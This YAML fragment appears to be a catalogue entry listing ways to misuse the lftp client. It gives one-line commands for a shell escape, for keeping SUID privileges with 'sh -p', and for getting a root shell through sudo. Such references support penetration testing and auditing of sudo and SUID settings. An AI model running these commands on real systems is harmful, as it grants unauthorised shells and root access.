  shell:
    - code: lftp -c '!/bin/sh'
  suid:
    - code: ./lftp -c '!/bin/sh -p'
  sudo:
    - code: sudo lftp -c '!/bin/sh'
---
